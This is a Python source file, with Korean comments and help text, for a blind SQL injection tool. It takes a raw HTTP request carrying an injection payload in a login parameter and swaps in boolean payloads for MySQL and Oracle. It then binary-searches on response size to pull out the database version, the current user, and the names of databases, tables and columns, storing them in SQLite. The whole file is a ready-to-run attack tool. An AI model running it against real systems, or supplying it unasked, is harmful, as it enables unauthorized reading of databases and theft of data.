# -*- coding: utf-8 -*-   
import sys
import urllib.parse
import requests
import warnings
import argparse
import sqlite3
import json
from time import sleep

warnings.filterwarnings('ignore')

########################################################################################################
############################################### JSON 타입 ###############################################

REQUEST_STRING = """
POST /api/login HTTP/1.1
Host: 192.168.219.100:5001
Content-Length: 44
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://192.168.219.100:5001
Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7
Connection: keep-alive

{"username":"'or 1=2 -- ","password":"1234"}
"""

# ############################################### GET 방식 ###############################################

# REQUEST_STRING = """
# GET /?username='or+1=2+--+&password=1 HTTP/1.1
# host: 192.168.219.100:5001
# Upgrade-Insecure-Requests: 1
# User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
# Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
# Referer: http://192.168.219.100:5001/?username=&password=
# Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7
# Connection: keep-alive

# """

############################################### POST 방식 ###############################################

# REQUEST_STRING = """
# POST / HTTP/1.1
# User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36
# Accept-Encoding: gzip, deflate, br
# Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
# Connection: keep-alive
# host: 192.168.219.100:5001
# Accept-Language: ko-KR,ko;q=0.9
# Upgrade-Insecure-Requests: 1
# Cookie: security_level=0; PHPSESSID=117eca5e7194d9415b200e7a15200933
# Content-Type: application/x-www-form-urlencoded
# Content-Length: 83

# username='%7C%7C(case+when+1=2+then+'kazal92'+else+'test'+end)%7C%7C'&password=1234
# """

########################################################################################################
########################################################################################################

class Colors:
    """터미널 출력 서식을위한 ANSI 컬러 코드"""
    BLACK = "\033[0;30m"
    RED = "\033[0;31m"
    GREEN = "\033[0;32m"
    BROWN = "\033[0;33m"
    BLUE = "\033[0;34m"
    PURPLE = "\033[0;35m"
    CYAN = "\033[0;36m"
    LIGHT_GRAY = "\033[0;37m"
    DARK_GRAY = "\033[1;30m"
    LIGHT_BLUE = "\033[1;31m"
    LIGHT_GREEN = "\033[1;32m"
    YELLOW = "\033[1;33m"
    LIGHT_RED = "\033[1;34m"
    LIGHT_PURPLE = "\033[1;35m"
    LIGHT_CYAN = "\033[1;36m"
    LIGHT_WHITE = "\033[1;37m"
    BOLD = "\033[1m"
    FAINT = "\033[2m"
    ITALIC = "\033[3m"
    UNDERLINE = "\033[4m"
    BLINK = "\033[5m"
    NEGATIVE = "\033[7m"
    CROSSED = "\033[9m"
    END = "\033[0m"


class ArgumentProcessor:
    def __init__(self):
        self.args = self.get_argument()

    def get_argument(self):
        parser = argparse.ArgumentParser(description="Blind SQL Injection Tool")
        group = parser.add_mutually_exclusive_group(required=True)
        
        parser.add_argument("-s", dest="schema", help="프로토콜 체계 (HTTP/HTTPS) -Ex) -S HTTP")
        parser.add_argument("-p", dest="parameter", help="대상 매개 변수 -Ex) -P 제목")
        parser.add_argument("-d", dest="result_db", help="결과 저장 결과 데이터베이스 이름 -Ex) -d result_db.db")
        parser.add_argument("-D", dest="select_db", help="대상 데이터베이스를 선택하십시오 -Ex) -D Bwapp")
        parser.add_argument("-T", dest="select_table", help="테이블을 선택하십시오 -Ex) -t 'users', 'example_table'(따옴표 선택 사항)")
        parser.add_argument("-C", dest="select_column", help="열 선택 -Ex) -C 'Blog', 'Heroes'(인용문 선택)")
        parser.add_argument("--dbms", dest="dbms", help="DBMS 선택 : MySQL, Oracle, MSSQL, PostgreSQL -Ex) -DBMS Oracle")
        parser.add_argument("--proxy", dest="proxy", help="대상 URL에 연결하려면 프록시를 사용하여 -Ex) -Proxy 127.0.0.1:8080")
        parser.add_argument("--dump", action="store_true", help="데이터베이스 테이블 항목을 덤프합니다")

        group.add_argument("--basic", action="store_true", help="기본 데이터베이스 정보를 추출하십시오")
        group.add_argument("--dbs", action="store_true", help="DBMS 데이터베이스 열거")
        group.add_argument("--tables", action="store_true", help="데이터베이스 테이블 열거 ")
        group.add_argument("--columns", action="store_true", help="테이블 열에 열거")

        options = parser.parse_args()
        
        if not options.parameter:
            parser.error("[-] Error: -P 매개 변수를 지정해야합니다. 자세한 내용은 -HELP를 사용하십시오.")
        if not options.schema:
            parser.error("[-] Error: -S 스키마를 지정해야합니다. 자세한 내용은 -HELP를 사용하십시오.")
        if not options.result_db:
            parser.error("[-] Error: -D 옵션은 결과를 저장하려면 데이터베이스 이름을 지정해야합니다. 자세한 내용은 -HELP를 사용하십시오.")
        if not options.dbms:
            parser.error("[-] Error: -dbms 옵션은 데이터베이스 유형을 지정해야합니다. 자세한 내용은 -HELP를 사용하십시오.")
        if not (options.basic or options.dbs or (options.tables and options.select_db) or 
                (options.columns and options.select_db and options.select_table)):
            parser.error("[-] Error: 다음 옵션 중 하나 이상을 지정해야합니다. -basic, -dbs, -tables, -columns. "
                         "사용 -자세한 정보는 help.")

        return options

class SQLiteProcessor:
    """추출 된 데이터를 저장하기 위해 SQLITE 데이터베이스 작업을 처리"""
    def __init__(self, db_file):
        self.conn = sqlite3.connect(db_file)
        self.cursor = self.conn.cursor()
        self._create_tables()
        
    def _create_tables(self):
        """존재하지 않으면 필요한 테이블을 만듭니다"""
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS basic_info (
                id INTEGER PRIMARY KEY AUTOINCREMENT, 
                version VARCHAR(255), 
                user VARCHAR(255), 
                UNIQUE(version, user)
            )''')
            
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS dbs_info (
                id INTEGER PRIMARY KEY AUTOINCREMENT, 
                db_name VARCHAR(255), 
                UNIQUE(db_name)
            )''')
            
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS table_info (
                id INTEGER PRIMARY KEY AUTOINCREMENT, 
                db_name VARCHAR(255), 
                table_name VARCHAR(255), 
                UNIQUE(db_name, table_name)
            )''')
            
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS column_info (
                id INTEGER PRIMARY KEY AUTOINCREMENT, 
                db_name VARCHAR(255), 
                table_name VARCHAR(255), 
                column_name VARCHAR(255), 
                UNIQUE(db_name, table_name, column_name)
            )''')
        
    def store_result(self, data_type, insert_data, select_db=None, select_table=None, field=None):
        """적절한 데이터베이스 테이블을 저장"""
        if data_type == "basic":
            if field == 'Version':
                self.cursor.execute("INSERT OR IGNORE INTO basic_info (version) VALUES (?)", (insert_data,))
            elif field == 'User':
                self.cursor.execute("UPDATE basic_info SET user = ? WHERE id = ?", (insert_data, 1))
            self.cursor.execute("DELETE FROM basic_info WHERE id != 1;")
            
        elif data_type == "dbs":
            self.cursor.execute("INSERT OR IGNORE INTO dbs_info (db_name) VALUES (?)", (insert_data,))
            
        elif data_type == "tables":
            self.cursor.execute("INSERT OR IGNORE INTO table_info (db_name, table_name) VALUES (?, ?)", 
                              (select_db, insert_data))
            
        elif data_type == "columns":
            self.cursor.execute("INSERT OR IGNORE INTO column_info (db_name, table_name, column_name) VALUES (?, ?, ?)", 
                              (select_db, select_table, insert_data))
            
        self.conn.commit()
        
    def close(self):
        """데이터베이스 연결을 닫기기"""
        self.conn.close()

class BlindSQLInjector:
    """블라인드 SQL 주입 공정을 처리하는 메인 클래스"""
    def __init__(self, args):
        self.args = args
        self.false_message_size = None  # 조건이 false 일 때 응답 크기
        self.db_manager = SQLiteProcessor(args.result_db)
        
    def url_encode(self, item):
        """URL은 문자열을 인코딩"""
        return urllib.parse.quote(item)

    def url_decode(self, item):
        """URL은 문자열을 디코딩"""
        return urllib.parse.unquote(item).replace('+', ' ')

    def normalize_request(self, req):
        """요청 문자열 형식을 정규화"""
        request_str = req
        if req.endswith('\n'):
            request_str = request_str.rstrip('\n')
        if not req.startswith('\n'):
            request_str = '\n' + request_str
        return request_str

    def parse_request(self, request):
        """HTTP 요청 구문 분석"""
        headers = {}  # 헤더 딕셔너리
        data = {}     # 파라미터 딕셔너리

        lines = request.split("\n")  # 한줄씩 쪼개서 넣기
        method, path_param, http_ver = lines[1].split()  # POST /v1/groups/814a75c9-f187-48c8-8c01-a9805212db0e/files/details?AAA=aaa&BBB=bbb HTTP/2

        if method == 'GET': # GET
            path, param_tmp = path_param.split("?") # param = AAA=aaa&BBB=bb
            param = param_tmp

            for line in lines[2:]:
                if ":" in line:
                    key, value = line.split(": ", 1)  # 콜론으로 값을 처리하기 위해 분할
                    key = key.lower()
                    headers[key] = value # 딕셔너리에 {헤더 : 값}
                    
            for get_param in param.split("&"):
                key, value = get_param.split("=", 1)
                data[key] = value # 딕셔너리에 {파라미터 : 값}
                
            url = headers['host']
            condition = self.url_decode(data[self.args.parameter])

        else:   # 이외 POST 등 일경우 body 값 파싱
            path = path_param.split("?", 1)[0]
            headers_string, data_string = request.split("\n\n", 1)
            
            for line in headers_string.split("\n"):
                if ":" in line:
                    key, value = line.split(": ", 1)  
                    headers[key.lower()] = value
                    
            url = headers['host']

            if headers.get('content-type') == 'application/json':
                try:
                    data = json.loads(data_string)  # JSON 파싱
                    condition = self.url_decode(data[self.args.parameter])
                except json.JSONDecodeError:
                    print(f"{Colors.LIGHT_BLUE}[-] JSON parsing error occurred{Colors.END}")
                    sys.exit(1)
            else:
                for param in data_string.split("&"):
                    key, value = param.split("=", 1)
                    data[key] = value
                condition = self.url_decode(data[self.args.parameter])

        print(f"Host: {url}\n")
        return (
            {
                'method': method,
                'url': url,
                'path': path,
                'headers': headers,
                'data': data,
            }, 
            condition
        )

    def create_payloads(self):
        """페이로드 선택"""
        dbms = self.args.dbms.lower()
        payloads = {}

        if dbms == 'oracle':
            if self.args.basic:
                print(f"{Colors.LIGHT_BLUE}{Colors.UNDERLINE} ORACLE Basic Information Extraction {Colors.END}\n")
                payloads = {
                    'Version': {
                        'count': "",
                        'len': "(SELECT LENGTH((SELECT banner FROM V$VERSION WHERE banner LIKE 'Oracle%')) FROM dual)>{mid_val}",
                        'version': "ascii(substr((SELECT banner FROM V$VERSION WHERE banner LIKE 'Oracle%'),{substr_index},1))>{mid_val}"
                    },
                    'User': {
                        'count': "",
                        'len': "(SELECT LENGTH((SELECT user FROM dual)) FROM dual)>{mid_val}",
                        'version': "ascii(substr((SELECT USER FROM dual),{substr_index},1))>{mid_val}"
                    },
                }
            elif self.args.dbs:
                print(f"{Colors.LIGHT_BLUE}{Colors.UNDERLINE} ORACLE Database Enumeration {Colors.END}\n")
                payloads = {
                    'Dbs': {
                        'count': "(SELECT count(*) FROM (SELECT DISTINCT owner FROM all_tables))>{mid_val}",
                        'len': "LENGTH((SELECT owner FROM (SELECT rownum r, owner FROM (SELECT DISTINCT owner FROM all_tables))tb WHERE tb.r={rows}))>{mid_val}",
                        'dbs': "ASCII(SUBSTR((SELECT owner FROM (SELECT rownum r, owner FROM (SELECT DISTINCT owner FROM all_tables))tb WHERE tb.r={rows}),{substr_index},1))>{mid_val}"
                    }
                }
            elif self.args.tables:
                print(f"{Colors.LIGHT_BLUE}{Colors.UNDERLINE} ORACLE Table Enumeration {Colors.END}\n")
                payloads = {
                    'Tables': {
                        'count': "(SELECT count(*) FROM all_tables WHERE owner='{select_db}')>{mid_val}",
                        'len': "LENGTH((SELECT table_name FROM (SELECT rownum r, table_name FROM all_tables WHERE owner='{select_db}')tb WHERE tb.r={rows}))>{mid_val}",
                        'tables': "ascii(SUBSTR((SELECT table_name FROM (SELECT rownum r, table_name FROM all_tables WHERE owner='{select_db}')tb WHERE tb.r={rows}),{substr_index},1))>{mid_val}"
                    }
                }
            elif self.args.columns:
                print(f"{Colors.LIGHT_BLUE}{Colors.UNDERLINE} ORACLE Column Enumeration {Colors.END}\n")
                payloads = {
                    'Columns': {
                        'count': "(SELECT count(*) FROM all_tab_columns WHERE owner='{select_db}' AND table_name='{select_table}')>{mid_val}",
                        'len': "LENGTH((SELECT column_name FROM (SELECT rownum r, column_name FROM all_tab_columns WHERE owner='{select_db}' AND table_name='{select_table}')tb WHERE tb.r={rows}))>{mid_val}",
                        'columns': "ASCII((SUBSTR((SELECT column_name FROM (SELECT rownum r, column_name FROM all_tab_columns WHERE owner='{select_db}' AND table_name='{select_table}')tb WHERE tb.r={rows}),{substr_index},1)))>{mid_val}"
                    }
                }
                
        elif dbms == 'mysql':
            if self.args.basic:
                print(f"{Colors.LIGHT_BLUE}{Colors.UNDERLINE} MySQL Basic Information Extraction {Colors.END}\n")
                payloads = {
                    'Version': {
                        'count': "",
                        'len': "(SELECT length((SELECT @@version)))>{mid_val}",
                        'version': "ascii(substr((SELECT @@version),{substr_index},1))>{mid_val}"
                    },
                    'User': {
                        'count': "",
                        'len': "(SELECT length((SELECT user())))>{mid_val}",
                        'version': "ascii(substr((SELECT user()),{substr_index},1))>{mid_val}"
                    },
                }
            elif self.args.dbs:
                print(f"{Colors.LIGHT_BLUE}{Colors.UNDERLINE} MySQL Database Enumeration {Colors.END}\n")
                payloads = {
                    'Dbs': {
                        'count': "(SELECT count(*) FROM information_schema.schemata WHERE schema_name NOT IN('mysql','information_schema'))>{mid_val}",
                        'len': "(SELECT length((SELECT schema_name FROM information_schema.schemata WHERE schema_name NOT IN('mysql','information_schema') LIMIT {rows},1)))>{mid_val}",
                        'dbs': "ascii(substr((SELECT schema_name FROM information_schema.schemata WHERE schema_name NOT IN('mysql','information_schema') LIMIT {rows},1),{substr_index},1))>{mid_val}"
                    }
                }
            elif self.args.tables:
                print(f"{Colors.LIGHT_BLUE}{Colors.UNDERLINE} MySQL Table Enumeration {Colors.END}\n")
                payloads = {
                    'Tables': {
                        'count': "(SELECT count(*) FROM information_schema.tables WHERE table_schema NOT IN('mysql','information_schema') AND table_schema IN('{select_db}'))>{mid_val}",
                        'len': "(SELECT length((SELECT table_name FROM information_schema.tables WHERE table_schema NOT IN('mysql','information_schema') AND table_schema IN('{select_db}') LIMIT {rows},1)))>{mid_val}",
                        'tables': "ascii(substr((SELECT table_name FROM information_schema.tables WHERE table_schema NOT IN('mysql','information_schema') AND table_schema IN('{select_db}') LIMIT {rows},1),{substr_index},1))>{mid_val}"
                    }
                }
            elif self.args.columns:
                print(f"{Colors.LIGHT_BLUE}{Colors.UNDERLINE} MySQL Column Enumeration {Colors.END}\n")
                payloads = {
                    'Columns': {
                        'count': "(SELECT count(*) FROM information_schema.columns WHERE table_schema NOT IN('mysql','information_schema') AND table_schema IN('{select_db}') AND table_name IN('{select_table}'))>{mid_val}",
                        'len': "(SELECT length((SELECT column_name FROM information_schema.columns WHERE table_schema NOT IN('mysql','information_schema') AND table_schema IN('{select_db}') AND table_name IN('{select_table}') LIMIT {rows},1)))>{mid_val}",
                        'columns': "ascii(substr((SELECT column_name FROM information_schema.columns WHERE table_schema NOT IN('mysql','information_schema') AND table_schema IN('{select_db}') AND table_name IN('{select_table}') LIMIT {rows},1),{substr_index},1))>{mid_val}"
                    }
                }
                
        # 여기에 향후 DBMS 지원 추가 (MSSQL, PostgreSQL 등)
                
        return payloads

    def customize_payloads(self, condition, payloads):
        result_payload = {}
        for key, value in payloads.items():
            result_payload[key] = {}  # 중첩 사전 초기화
            for key2, value2 in value.items():
                payload_tmp = condition.replace('1=2', value2)
                result_payload[key][key2] = payload_tmp
        return result_payload

    def establish_baseline(self, data):
        """거짓 조건에 대한 기준 응답 크기를 설정"""
        method = data['method']
        url = data['url']
        path = data['path']
        headers = data['headers']
        data_params = data['data']
        
        # 조작을 위해 매개 변수 값이 디코딩
        data_params[self.args.parameter] = self.url_decode(data_params[self.args.parameter])
        
        proxies = {'http': self.args.proxy, 'https': self.args.proxy} if self.args.proxy else None
        timeout = 30
        
        try:
            if method == 'GET':
                params = '&'.join([f"{key}={value}" for key, value in data_params.items()])
                full_url = f"{self.args.schema}://{url}{path}?{params}"
                response = requests.request(method, full_url, headers=headers, proxies=proxies, timeout=timeout, verify=False)
                self.false_message_size = len(response.content)
                
            else:  # 게시물 또는 기타 방법
                full_url = f"{self.args.schema}://{url}{path}"
                if headers.get('content-type') == 'application/json':
                    response = requests.request(method, full_url, headers=headers, json=data_params, proxies=proxies, timeout=timeout, verify=False)
                else:
                    response = requests.request(method, full_url, headers=headers, data=data_params, proxies=proxies, timeout=timeout, verify=False)
                    
                self.false_message_size = len(response.content)
                
        except requests.exceptions.RequestException as e:
            print(f"{Colors.LIGHT_BLUE}[-] Connection error: {e}{Colors.END}")
            sys.exit(1)

    def send_request(self, data_val):
        """주입 된 페이로드로 요청을 보내고 응답을 확인"""
        method = data_val['method']
        url = data_val['url']
        path = data_val['path']
        headers = data_val['headers']
        data_params = data_val['data']
        
        # GET을 사용하는 경우 URL 인코딩
        if method == 'GET':
            data_params[self.args.parameter] = self.url_encode(data_params[self.args.parameter])
        
        proxies = {'http': self.args.proxy, 'https': self.args.proxy} if self.args.proxy else None
        timeout = 30
        
        try:
            if method == 'GET':
                params = '&'.join([f"{key}={value}" for key, value in data_params.items()])
                full_url = f"{self.args.schema}://{url}{path}?{params}"
                response = requests.request(method, full_url, headers=headers, proxies=proxies, 
                                          timeout=timeout, verify=False)
                check_message_size = len(response.content)
                
            else: 
                full_url = f"{self.args.schema}://{url}{path}"
                if headers.get('content-type') == 'application/json':
                    response = requests.request(method, full_url, headers=headers, json=data_params, proxies=proxies, timeout=timeout, verify=False)
                else:
                    response = requests.request(method, full_url, headers=headers, data=data_params, proxies=proxies, timeout=timeout, verify=False)
                    
                check_message_size = len(response.content)
                
            #응답 크기가 기준선과 다른 경우 true
            return self.false_message_size != check_message_size
            
        except requests.exceptions.RequestException as e:
            print(f"{Colors.LIGHT_BLUE}[-] Connection error: {e}{Colors.END}")
            return False

    def binary_search(self, min_val, max_val, data_val, payload_fix, substr_index=None, rows_=None, select_db=None, select_table=None, select_column=None):
        """이진 검색"""
        mid_val = int((min_val + max_val) / 2)
        
        # 현재 값으로 페이로드를 형식화
        payload_insert = payload_fix.format(
            rows=rows_, 
            substr_index=substr_index, 
            mid_val=mid_val, 
            select_db=select_db, 
            select_table=select_table, 
            select_column=select_column
        )
        
        # 페이로드를 매개 변수에 주입
        data_val['data'][self.args.parameter] = payload_insert
        
        # 요청을 보내고 결과를 얻습니다
        bin_result = self.send_request(data_val)
        
        # 기본 케이스 - 범위가 좁아지면 1
        if max_val - min_val <= 1:
            return max_val if bin_result else min_val
        
        # 재귀 검색
        if bin_result:
            return self.binary_search(mid_val, max_val, data_val, payload_fix, substr_index, rows_, 
                                    select_db, select_table, select_column)
        else:
            return self.binary_search(min_val, mid_val, data_val, payload_fix, substr_index, rows_, 
                                    select_db, select_table, select_column)

    def execute_injection(self):
        # 구문 분석 요청 및 기준선 설정
        normalized_request = self.normalize_request(REQUEST_STRING) # 응답데이터 파싱
        data, condition = self.parse_request(normalized_request)
        self.establish_baseline(data)
        
       # 페이로드를 생성하고 사용자 정의
        payloads = self.create_payloads()
        result_payload = self.customize_payloads(condition, payloads) # 조건식에서 1=2 을 페이로드로 리플레이스
        
        # 추출 테이블 준비 (열 옵션)
        select_tables = [None]  # -dbs 및 -테이블에 대한 기본값
        if self.args.select_table and self.args.columns:
            select_tables = []
            select_tmp = self.args.select_table.split(',')
            for tmp in select_tmp:
                tmp2 = tmp.replace("'", "").strip()
                select_tables.append(tmp2)
        
        result_data = {}
        
        # 각 테이블을 처리 (또는 열이 추출되지 않으면 기본값)
        for select_table_one in select_tables:
            name_tmp = []
            result_tmp = []
            data_len = 0
            
            # 행 카운트 결정 (기본 정보 제외)
            if not self.args.basic:
                for key, value in result_payload.items():
                    row_count = self.binary_search(0, 127, data, result_payload[key]['count'], None, None, 
                                                 self.args.select_db, select_table_one, None)
            else:
                row_count = 1
                
            print(f"{Colors.GREEN}[*] '{select_table_one}' Count: {str(row_count)}{Colors.END}" 
                  if select_table_one else f"{Colors.GREEN}[*] Record count: {str(row_count)}{Colors.END}")

            # 각 행을 처리
            for rows in range(0, row_count):
                for key, value in result_payload.items():
                    name_tmp.append(key)
                    for key2, value2 in list(value.items())[1:]:  #딕셔너리를 리스트로 변환 후 첫번째 값(count)는 제외하고 실행 
                        if key2 == 'len':
                            # Oracle Rownum은 1에서 시작
                            if self.args.dbms.lower() == 'oracle': # 오라클일 경우 rownum은 1부터 시작하기에 + 1 해야됨
                                rows += 1 # 길이를 구하고 이름을 뽑고하는 방식이기 때문에 길이를 구할때만 +1하면됨
                            data_len = self.binary_search(0, 127, data, value2, None, rows, 
                                                        self.args.select_db, select_table_one, None)
                            print(f"[*] Length: {str(data_len)}")
                        else:
                            name_str = ""
                            for substr_index in range(0, data_len): # 데이터 글자 수 만큼 반복
                                char_code = self.binary_search(0, 127, data, value2, substr_index + 1, rows, 
                                                             self.args.select_db, select_table_one, None)
                                name_str += chr(char_code)
                                
                            # SQLITE의 저장 결과
                            data_type = "basic" if self.args.basic else "dbs" if self.args.dbs else "tables" if self.args.tables else "columns"
                            self.db_manager.store_result(data_type, name_str, self.args.select_db, select_table_one, key)
                            
                            result_tmp.append(name_str)
                            print(f"[+] ['{name_str}']")

                # 형식 및 최종 결과를 저장
                if self.args.basic:
                    num = 0
                    for name in name_tmp:
                        result_data[name] = result_tmp[num]
                        num += 1
                    print(f"{Colors.LIGHT_RED}[+] {result_data}{Colors.END}")
                else:
                    if select_table_one:
                        result_data[select_table_one] = result_tmp
                    else:
                        result_data[list(name_tmp)[0]] = result_tmp

            if select_table_one:
                print(f"{Colors.LIGHT_RED}[+] '{select_table_one}': {result_data[select_table_one]}{Colors.END}")
            else:
                if not self.args.basic:
                    first_name = list(name_tmp)[0]
                    print(f"{Colors.LIGHT_RED}[+] '{first_name}' data: {result_data[first_name]}{Colors.END}")
                                            
                    result_tmp = []  # 다음 테이블에 대한 재설정

        # 최종 결과를 표시
        print(f"\n{Colors.LIGHT_BLUE}[+] Final Results{Colors.END}")
        for key, value in result_data.items():
            print(f"{Colors.GREEN}{Colors.BOLD}{key}:{Colors.END} {Colors.RED}{value}{Colors.END}")
        print(f"\n{Colors.LIGHT_BLUE}[+] SQLite storage complete!{Colors.END}\n")

def main():
    print(f"\n{Colors.LIGHT_BLUE}{Colors.BOLD}=================================================================={Colors.END}")
    print(f"{Colors.LIGHT_BLUE}{Colors.BOLD}                    Blind SQL Injection Tool                    {Colors.END}")
    print(f"{Colors.LIGHT_BLUE}{Colors.BOLD}=================================================================={Colors.END}\n")
    
    # 프로세스 인수
    arg_processor = ArgumentProcessor()
    args = arg_processor.args
    
    # 인젝터를 만들고 실행
    injector = BlindSQLInjector(args)
    injector.execute_injection()

if __name__ == '__main__':
    main()
